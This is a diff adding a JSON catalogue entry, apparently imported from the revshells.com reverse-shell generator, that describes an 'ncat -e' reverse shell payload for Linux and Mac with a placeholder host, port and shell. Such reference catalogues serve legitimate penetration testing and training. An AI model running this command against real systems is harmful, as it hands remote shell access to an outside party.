@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-ncat-e",
+  "name": "RSG · ReverseShell · ncat -e",
+  "command": "ncat <lhost> <lport> -e <shell>",
+  "description": "Reverse Shell payload — ncat -e (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/ncat -e/10",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
